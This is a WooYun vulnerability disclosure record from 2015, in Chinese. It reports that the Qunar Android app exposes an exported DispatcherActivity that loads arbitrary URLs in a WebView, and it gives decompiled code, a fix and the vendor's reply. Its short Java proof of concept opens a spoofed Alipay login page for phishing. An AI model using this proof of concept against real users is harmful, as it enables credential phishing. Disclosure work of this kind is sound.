{"id": 66990, "wybug_id": "wooyun-2015-0135403", "wybug_title": "去哪儿安卓客户端组件暴露可实现钓鱼", "wybug_corp": "去哪儿", "wybug_author": "hh88", "wybug_date": "2015-08-20 10:18", "wybug_open_date": "2015-11-19 16:02", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端程序设计错误", "客户端程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向公众公开  简要描述： 去哪儿安卓客户端容易出现钓鱼 详细说明：  \n组件com.mqunar.dispatcher.DispatcherActivity暴露给第三方应用(不用root)就可利用uri其执行WebView.在manifest文件中 <activity android:configChanges=\"keyboardHidden|orientation\" android:name=\"com.mqunar.dispatcher.DispatcherActivity\" android:screenOrientation=\"portrait\" android:theme=\"@android:style/Theme.Translucent.NoTitleBar\">反编译后代码  protected void onCreate(Bundle paramBundle)  {    super.onCreate(paramBundle);    QunarApkLoader.loadResourceWithoutBroadcast(this);    requestWindowFeature(1);    if (paramBundle == null) {      DispatcherLogic.processIntent(this, getIntent());    }  }  在DispatcherLogic中从方法processIntent到a  private static void a(Object paramObject, Intent paramIntent, Uri paramUri, boolean paramBoolean)  {    if (paramBoolean) {}    for (;;)    {      try      {        Uri localUri1 = Uri.parse(\"http://touch.qunar.com/appredirect?url=\" + URLEncoder.encode(paramUri.toString(), \"UTF-8\"));        QLog.d(\"spider\", \"openWebView url is \" + paramUri, new Object[0]);        paramUri = new Intent();        paramUri.putExtras(paramIntent);        paramUri.putExtra(\"url\", localUri1.toString());        paramUri.setClass(a(paramObject), WebActivity.class);        paramUri.addFlags(268435456);        c(paramObject, paramUri);        b(paramObject);        return;      }      catch (UnsupportedEncodingException localUnsupportedEncodingException) {}      Uri localUri2 = paramUri;    }  }\n   漏洞证明：  利用它来打开支付宝登录界面，编写POC代码 或用am命令也可以\npublic static void DispatcherActivity_poc(Context context){    \t Intent intent=new Intent();    \t String str=\"http://auth.alipay.com\"; \t \tUri uri = Uri.parse(str); \t\tintent.putExtra(\"_RESULT_BROADCAST_MESSAGE_ACTION_\", \"xxxxxxx\"); \t\tintent.setData(uri); \t\tintent.setClassName(\"com.Qunar\", \"com.mqunar.dispatcher.DispatcherActivity\");    \t context.startActivity(intent);     }\n可以钓鱼啦，操纵url访问任意网页，还可执行javascript代码，可以干的事很多，不一一列举了\n\n   修复方案：  该Activity组件设为exported:false，或者禁止第三方应用传入appUrl。   版权声明：转载请注明来源 hh88@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-21 16:01 厂商回复： 感谢关注去哪儿网安全，已经安排业务同学进行处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-21 16:13 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:483 漏洞数:117        | 茶凉了，就不要再续了，再续也不是原来的味...)\t\t \n  @hh88 专业钓鱼    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}